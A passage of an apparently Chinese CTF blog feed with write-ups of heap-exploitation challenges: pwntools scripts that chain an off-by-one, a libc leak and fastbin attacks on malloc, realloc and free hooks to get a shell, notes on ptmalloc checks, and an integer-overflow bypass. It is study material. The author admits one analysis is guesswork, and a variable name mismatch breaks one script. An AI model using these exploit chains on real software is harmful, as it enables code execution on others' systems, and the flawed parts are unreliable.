class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./easy_pwn'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, <span class="string">'1'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, size, content)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, <span class="string">'2'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, str(index))</span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, str(size))</span><br><span class="line">    sh.sendafter(<span class="string">': '</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, <span class="string">'3'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, <span class="string">'4'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, str(index))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x18</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#3</span></span><br></pre></td></tr></table></figure><p>此处先构造好堆块，为什么设置0x18呢。</p> <img src="/2019/10/28/fastedbin-attack-探究/1571551706196.png"> <p>这题的规则就是你create的size位多少，它就允许你写入多少，off by one修改下一堆块的size位的话，自然需要0x18的size，覆盖pre_size，使得off by one能够覆盖下一堆块的size位。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">0</span>,<span class="number">0x18</span> +<span class="number">10</span>, <span class="string">'a'</span>*<span class="number">0x18</span> + p8(<span class="number">0x91</span>) )</span><br></pre></td></tr></table></figure><img src="/2019/10/28/fastedbin-attack-探究/1571551912003.png"><p>成功修改！注意，这里使用了堆叠技巧。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>将整个0x91的伪造堆块放入unsorted bin里面</p><img src="/2019/10/28/fastedbin-attack-探究/1571552115654.png"><img src="/2019/10/28/fastedbin-attack-探究/1571552133076.png"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x18</span>)</span><br></pre></td></tr></table></figure><p>这里是为了create分割堆块，使得unsorted bin的地址落入chunk2的内容里。因为chunk2实际上没有被free，所以允许show出地址。同时为了下面的fastedbin attack做准备。</p><img src="/2019/10/28/fastedbin-attack-探究/1571552279804.png"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">show(<span class="number">2</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'content: '</span>)</span><br><span class="line">result = u64(sh.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.success(<span class="string">'result = '</span> + hex(result))</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">libc_addr = result - <span class="number">0x3c4b78</span></span><br></pre></td></tr></table></figure><p>此处的0x3c4b78是根据leak出的 unsorted bin 地址减去 /proc/线程号/maps里的libc基址得到的。</p><p>因为偏移量是不变的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">2</span>, <span class="number">0x10</span>, p64(<span class="number">0</span>) + p64(libc_addr + libc.symbols[<span class="string">'__free_hook'</span>] - <span class="number">0x40</span>))</span><br><span class="line">gdb.attach(sh)</span><br></pre></td></tr></table></figure><img src="/2019/10/28/fastedbin-attack-探究/1571553593599.png"><p>此处修改bk为__free_hook - 0x40的地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x68</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br></pre></td></tr></table></figure><img src="/2019/10/28/fastedbin-attack-探究/1571556976417.png"> <img src="/2019/10/28/fastedbin-attack-探究/1571553628633.png"> <p>此处为了使得fasted bin 0x70里面存在free后的堆块，使得后面fd攻击成功</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">2</span>, <span class="number">8</span>, p64(libc_addr + libc.symbols[<span class="string">'__free_hook'</span>] - <span class="number">0x33</span>))</span><br></pre></td></tr></table></figure><p>修改fd位</p><img src="/2019/10/28/fastedbin-attack-探究/1571557000576.png"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x68</span>)<span class="comment">#5</span></span><br></pre></td></tr></table></figure><img src="/2019/10/28/fastedbin-attack-探究/1571554995553.png"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x68</span>)<span class="comment">#6</span></span><br><span class="line">edit(<span class="number">5</span>, <span class="number">0x23</span> + <span class="number">8</span>, <span class="string">''</span> * <span class="number">0x23</span> + p64(libc_addr + libc.symbols[<span class="string">'system'</span>]))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>好了，我摊牌了，我是傻逼，看不懂上面那个修改BK的操作，上面是胡乱分析的。</p><p>刚好，也借用这道题来尝试不同的打法！</p><h5 id="第一种-malloc-hook"><a href="#第一种-malloc-hook" class="headerlink" title="第一种:malloc_hook"></a>第一种:malloc_hook</h5><p>malloc函数会首先检查malloc_hook的值，若不为0则会调用他。若我们能通过内存写入malloc_hook即可实现任意地址跳转!<br>可通过fastbin_attack，我们从malloc_hook往上面观察，会发现在malloc_hook上方存在一个0x7fxxxxxx的数据，而我们可以通过错位，刚好使得7f的位置移动到类似于正常堆块的size的位置从而成功写入chunk。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./easy_pwn'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#sh = remote('node3.buuoj.cn',28685)</span></span><br><span class="line"><span class="comment">#libc = ELF('./x64_libc.so.6')</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, <span class="string">'1'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, size, content)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, <span class="string">'2'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, str(index))</span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, str(size))</span><br><span class="line">    sh.sendafter(<span class="string">': '</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, <span class="string">'3'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, <span class="string">'4'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">z</span><span class="params">(commond=<span class="string">''</span>)</span>:</span></span><br><span class="line">    gdb.attach(sh,commond)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#3</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x18</span> +<span class="number">10</span>, <span class="string">'a'</span>*<span class="number">0x18</span> + p8(<span class="number">0x91</span>) )</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#1</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#sh.recvuntil("choice: ")</span></span><br><span class="line">result = u64(sh.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.success(<span class="string">'result = '</span> + hex(result))</span><br><span class="line">libc_addr = result - <span class="number">0x3c4b78</span></span><br><span class="line">malloc_hook = libc_addr +<span class="number">0x3c4b10</span></span><br><span class="line">log.success(<span class="string">'malloc_hook = '</span> + hex(malloc_hook))</span><br><span class="line">ong_a = libc_addr + <span class="number">0x4526a</span></span><br><span class="line"><span class="comment">#edit(2, 0x10, p64(0) + p64(libc_addr + libc.symbols['__free_hook'] - 0x40))</span></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">payload = p64(malloc_hook<span class="number">-0x23</span>)</span><br><span class="line">edit(<span class="number">2</span>, len(payload), payload)</span><br><span class="line"><span class="comment">#z()</span></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#6</span></span><br><span class="line"><span class="comment">#payload='a'*0xb+p64(ong_a)+p64(libc_addr+libc.symbols["realloc"])</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x13</span> +p64(one_a)</span><br><span class="line"><span class="comment">#z()</span></span><br><span class="line">edit(<span class="number">5</span>, len(payload), payload)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h5 id="第二种-realloc-hook"><a href="#第二种-realloc-hook" class="headerlink" title="第二种:realloc_hook"></a>第二种:realloc_hook</h5><p>众所周知，one_gadget要想成功得需要环境的匹配，那么有的时候会遇上环境原因而导致one_gadget全部不可用。这个时候就需要realloc_hook来调整堆栈使得one_gadget可用。</p><p>realloc函数在函数起始会检查realloc_hook的值是否为0，不为0则跳转至realloc_hook指向地址。<br>realloc_hook同malloc_hook相邻(也就是malloc_hook-0x08)，故可通过fastbin attack一同修改两个值。</p><p><img src="https://bbs.pediy.com/upload/attach/201901/3_8D489B4GNW7QYK4.jpg" alt="img"></p><p><img src="https://bbs.pediy.com/upload/attach/201901/3_CPMMKR8DZNMSN73.jpg" alt="img"></p><p>流程为push寄存器，最后全部pop出来跳转至realloc_hook的值。<br>将realloc_hook设置为选择好的one_gadget，将malloc_hook设置为realloc函数开头某一push寄存器处。push和pop的次数是一致的，若push次数减少则会压低堆栈，改变栈环境。这时one_gadget就会可以使用。具体要压低栈多少要根据环境决定，这里我们可以进行小于48字节内或72字节的堆栈调整。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./easy_pwn'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#sh = remote('node3.buuoj.cn',28685)</span></span><br><span class="line"><span class="comment">#libc = ELF('./x64_libc.so.6')</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, <span class="string">'1'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, size, content)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, <span class="string">'2'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, str(index))</span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, str(size))</span><br><span class="line">    sh.sendafter(<span class="string">': '</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, <span class="string">'3'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, <span class="string">'4'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">z</span><span class="params">(commond=<span class="string">''</span>)</span>:</span></span><br><span class="line">    gdb.attach(sh,commond)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#3</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x18</span> +<span class="number">10</span>, <span class="string">'a'</span>*<span class="number">0x18</span> + p8(<span class="number">0x91</span>) )</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#1</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#sh.recvuntil("choice: ")</span></span><br><span class="line">result = u64(sh.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.success(<span class="string">'result = '</span> + hex(result))</span><br><span class="line">libc_addr = result - <span class="number">0x3c4b78</span></span><br><span class="line">malloc_hook = libc_addr +<span class="number">0x3c4b10</span></span><br><span class="line">log.success(<span class="string">'malloc_hook = '</span> + hex(malloc_hook))</span><br><span class="line">ong_a = libc_addr + <span class="number">0x4526a</span></span><br><span class="line"><span class="comment">#edit(2, 0x10, p64(0) + p64(libc_addr + libc.symbols['__free_hook'] - 0x40))</span></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">payload = p64(malloc_hook<span class="number">-0x23</span>)</span><br><span class="line">edit(<span class="number">2</span>, len(payload), payload)</span><br><span class="line"><span class="comment">#z()</span></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#6</span></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0xb</span>+p64(ong_a)+p64(libc_addr+libc.symbols[<span class="string">"realloc"</span>])</span><br><span class="line"><span class="comment">#payload = 'a'*0x13 +p64(one_a)</span></span><br><span class="line"><span class="comment">#z()</span></span><br><span class="line">edit(<span class="number">5</span>, len(payload), payload)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="fasted-bin-attack注意事项"><a href="#fasted-bin-attack注意事项" class="headerlink" title="fasted bin attack注意事项"></a>fasted bin attack注意事项</h2><p>（实际上只是自己笨，记录一点fasted bin的各种检测，以及各种绕过检测，成功attack的方法）</p><h3 id="（一）"><a href="#（一）" class="headerlink" title="（一）"></a>（一）</h3><p>先来看ptmalloc的响应用户内存分配要求的具体步骤：</p><blockquote><p>1) 获取分配区的锁，为了防止多个线程同时访问同一个分配区，在进行分配之前需要 取得分配区域的锁。线程先查看线程私有实例中是否已经存在一个分配区，如果存 在尝试对该分配区加锁，如果加锁成功，使用该分配区分配内存，否则，该线程搜 索分配区循环链表试图获得一个空闲（没有加锁）的分配区。如果所有的分配区都 已经加锁，那么 ptmalloc 会开辟一个新的分配区，把该分配区加入到全局分配区循 环链表和线程的私有实例中并加锁，然后使用该分配区进行分配操作。开辟出来的 新分配区一定为非主分配区，因为主分配区是从父进程那里继承来的。开辟非主分 配区时会调用 mmap()创建一个 sub-heap，并设置好 top chunk。 </p><p>2) 将用户的请求大小转换为实际需要分配的 chunk 空间大小。  </p><p>3) 判断所需分配chunk的大小是否满足chunk_size &lt;= max_fast (max_fast 默认为 64B)， 如果是的话，则转下一步，否则跳到第 5 步。 </p><p>4) 首先尝试在 fast bins 中取一个所需大小的 chunk 分配给用户。如果可以找到，则分 配结束。否则转到下一步。 </p></blockquote><p>其实看到第四步就可，我们只讲述fast bin范围内的。</p><h3 id="（二）"><a href="#（二）" class="headerlink" title="（二）"></a>（二）</h3><p>fast bin是一个单链表，是一个LIFO(<em>Last in, first out</em>后进先出)</p><p>即</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ptr1 = <span class="built_in">malloc</span>(<span class="number">0x20</span>)#chunk1;</span><br><span class="line">    ptr2 = <span class="built_in">malloc</span>(<span class="number">0x30</span>)#chunk2;</span><br><span class="line">    ptr3 = <span class="built_in">malloc</span>(<span class="number">0x40</span>)#chunk3;</span><br><span class="line">    <span class="built_in">free</span>(ptr1);</span><br><span class="line">    <span class="built_in">free</span>(ptr2);</span><br><span class="line">    <span class="built_in">free</span>(ptr3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们仿照《glibc内存管理》一书中对于bins数组的结构来展示fast bin链表</p><p><img src="D:%5Cblog%5CHexo%5Csource_posts%5C%C2%96fastedbin-attack-%E6%8E%A2%E7%A9%B6%5Cimage-20191208011303551.png" alt="image-20191208011303551"></p><p>在fast bin的链表中结构为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">classDiagram</span><br><span class="line">fast bin &lt;|-- chunk1</span><br><span class="line">chunk1 : fd = </span><br><span class="line">chunk1 : bk()</span><br><span class="line">chunk1 &lt;|-- chunk2</span><br><span class="line">chunk2 : fd = chunk1</span><br><span class="line">chunk2 : bk()</span><br><span class="line">chunk2 &lt;|-- chunk3</span><br><span class="line">chunk3 : fd = chunk2</span><br><span class="line">chunk3 : bk()</span><br></pre></td></tr></table></figure><p>再次进行调用的时候，是先取用chunk3再取用chunk2再取用chunk1。这就是FILO。</p><p>至于为什么新free的chunk不直接插到靠近fast bin的地方，如果直接插到靠近fast bin的地方话每次都要迭代到最后一个chunk然后把它的fd赋值为新的chunk的地址，而使用LIFO，我们只需要修改fastbinsY[0]指针的值和新的chunk的值，花费在fastbin链有很多的时候肯定是更少的</p><h3 id="（三）"><a href="#（三）" class="headerlink" title="（三）"></a>（三）</h3><p>此时讲述的是malloc - free后的再次malloc环节</p><p>在我们进行fasted bin attack 打 hook，从 fastbin 中取出 chunk 的时候会对 chunk 的size 做检查，也就是这个任意位置的 chunk 的 size 位必须构造。</p><p>来看fastbin获取index的源码</p><blockquote><p>/* offset 2 to use otherwise unindexable first 2 bins */<br> #define fastbin_index(sz) \   </p><p>​    ((((unsigned int)(sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2) </p><p>宏 fastbin_index(sz)用于获得 fast bin 在 fast bins 数组中的 index，由于 bin[0]和 bin[1]中 的chunk不存在，所以需要减2。</p></blockquote><p>个人理解：在64位里也就是(sz) &gt;&gt; 4获取Index。因此很多时候就可以构造0x7f大小的fastbin，代替很难找到的0x71\0x70大小的fastbin。</p><p>举个例子。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastbin -&gt; 0x602078</span><br></pre></td></tr></table></figure><p>fastbin在malloc的时候会对size进行检查，也就是检查address+8的值是否为合法size。（即检查0x602080）</p><p>至于检测的方法，就是上面获取index的源码，进行&gt;&gt;运算，这就是我们为什么可以利用unsorted bin任意地址写，配合fasted bin attack的原因了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;fastbin-double-free&quot;&gt;&lt;a href=&quot;#fastbin-double-free&quot; class=&quot;headerlink&quot; title=&quot;fastbin double free&quot;&gt;&lt;/a&gt;fastbin double free&lt;/h3&gt;&lt;p&gt; F
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>360赛</title>
    <link href="http://yoursite.com/2019/10/19/360%E8%B5%9B/"/>
    <id>http://yoursite.com/2019/10/19/360%E8%B5%9B/</id>
    <published>2019-10-19T14:07:33.863Z</published>
    <updated>2019-10-19T14:40:47.920Z</updated>
    
    <content type="html"><![CDATA[<h3 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h3><p>这题还是有点意思的，考点在于补码与unsigned int。</p><p>首先观察bypass1，第一个if判断是不允许出现“ - ”号， 第二个if判断是x &lt;= 359 , y &lt;=  359 , x-y = 360</p><p>那么自然考虑－数。</p><!-- 原码是最直观的表示方式：最高位表示符号(0表示正，1表示负) --><!--补码的表示方法是:--><!--正数的补码就是其本身--><!--负数的补码是在其原码的基础上, 符号位不变, 其余各位取反, 最后+1. (即在反码的基础上+1)--><!--[+1] = [00000001]原 = [00000001]反 = [00000001]补--><!--[-1] = [10000001]原 = [11111110]反 = [11111111]补--><p>而我们可以根据ida观察到，此次的两个bypass都是unsigned int，而 unsigned int的特点是：最高位不作为符号位，所有位都表示值。</p><h4 id="bypass1"><a href="#bypass1" class="headerlink" title="bypass1"></a>bypass1</h4><p>故此，0xFFFF FFFF   ( 1111 1111 1111 1111 1111 1111 1111 1111)就表示-1</p><p>所以bypass1 可以通过x = 359 , y = 4294967295 绕过</p><h4 id="bypass2"><a href="#bypass2" class="headerlink" title="bypass2"></a>bypass2</h4><p>第二个是乘法，且条件为x &gt; 1 &amp;&amp; y &gt; 360 &amp;&amp; x * y =360</p><p>这次利用整数溢出</p><p>4294967295 + 361 = 4294967656 （0001 0000 0000 0000 0000 0000 0001 0110 1000）</p><p>毫无疑问超过了32位，unsigned int 取前32位，自然就是0000 0000 0000 0000 0000 0001 0110 1000</p><p>所以 只要x * y = 4294967656就可以通过</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;pwn2&quot;&gt;&lt;a href=&quot;#pwn2&quot; class=&quot;headerlink&quot; title=&quot;pwn2&quot;&gt;&lt;/a&gt;pwn2&lt;/h3&gt;&lt;p&gt;这题还是有点意思的，考点在于补码与unsigned int。&lt;/p&gt;
&lt;p&gt;首先观察bypass1，第一个if判断是不允许出
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>第五空间线下赛（pwn）</title>
    <link href="http://yoursite.com/2019/10/18/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BA%BF%E4%B8%8B%E8%B5%9B%EF%BC%88pwn%EF%BC%89/"/>
    <id>http://yoursite.com/2019/10/18/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BA%BF%E4%B8%8B%E8%B5%9B%EF%BC%88pwn%EF%BC%89/</id>
    <published>2019-10-18T04:23:45.262Z</published>
    <updated>2019-11-14T09:47:45.409Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一"><a href="#一" class="headerlink" title="一"></a>一</h3><p>首先ida查看，是一个标准的堆题</p><p>查看delete，uaf漏洞</p><p>那么自然是fasted bin attack + unsortd bin 的组合攻击</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span 